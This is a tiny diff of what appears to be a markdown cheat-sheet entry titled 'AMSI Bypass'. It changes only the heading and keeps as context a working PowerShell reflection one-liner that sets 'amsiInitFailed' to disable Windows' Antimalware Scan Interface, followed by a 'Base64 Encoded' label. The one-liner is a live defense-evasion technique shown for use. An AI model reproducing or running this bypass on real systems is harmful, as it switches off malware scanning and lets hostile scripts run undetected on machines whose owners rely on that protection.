@@ -1,4 +1,4 @@
-# AMSI Bypass
+# AMSI Bypass re
   
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
   Base64 Encoded
